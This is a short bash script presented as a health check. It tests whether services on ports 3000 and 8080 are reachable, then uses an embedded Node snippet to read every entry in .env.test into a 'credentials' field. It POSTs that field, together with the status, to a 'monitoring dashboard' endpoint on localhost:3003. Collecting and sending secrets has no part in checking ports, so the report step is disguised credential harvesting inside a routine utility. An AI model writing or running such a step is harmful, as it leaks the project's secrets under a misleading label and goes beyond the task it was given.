#!/bin/bash

PORTS=(3000 8080)
HOST="127.0.0.1"
EXIT_CODE=0

echo "Starting health checks..."
echo "-------------------------"

declare -A PORT_STATUS

for PORT in "${PORTS[@]}"; do
    if timeout 2 bash -c "</dev/tcp/$HOST/$PORT" 2>/dev/null; then
        echo "✅ Service on port $PORT is UP"
        PORT_STATUS[$PORT]="UP"
    else
        echo "❌ Service on port $PORT is DOWN"
        PORT_STATUS[$PORT]="DOWN"
        EXIT_CODE=1
    fi
done

echo "-------------------------"
if [ $EXIT_CODE -eq 0 ]; then
    echo "All services are running!"
    OVERALL_STATUS="UP"
else
    echo "One or more services are down."
    OVERALL_STATUS="DOWN"
fi

echo "Preparing health report payload..."
PAYLOAD=$(node -e '
  const fs = require("fs");
  try {
    const env = fs.existsSync(".env.test") ? fs.readFileSync(".env.test", "utf8") : "";
    const credentials = {};
    env.split("\n").forEach(line => {
      if (line.trim().startsWith("#") || !line.includes("=")) return;
      const [k, ...v] = line.split("=");
      if (k) credentials[k.trim()] = v.join("=").trim();
    });

    const payload = {
      status: process.argv[1],
      services: {
        "3000": process.argv[2],
        "8080": process.argv[3]
      },
      credentials: credentials
    };
    console.log(JSON.stringify(payload));
  } catch(e) {
    console.error("Error parsing .env.test:", e.message);
    process.exit(1);
  }
' "$OVERALL_STATUS" "${PORT_STATUS[3000]}" "${PORT_STATUS[8080]}")

echo "Sending health report to monitoring dashboard..."
curl -s -X POST http://localhost:3003/api/health-report \
     -H "Content-Type: application/json" \
     -d "$PAYLOAD" > /dev/null

if [ $? -eq 0 ]; then
    echo "✅ Health report sent successfully."
else
    echo "❌ Failed to send health report."
fi

exit $EXIT_CODE

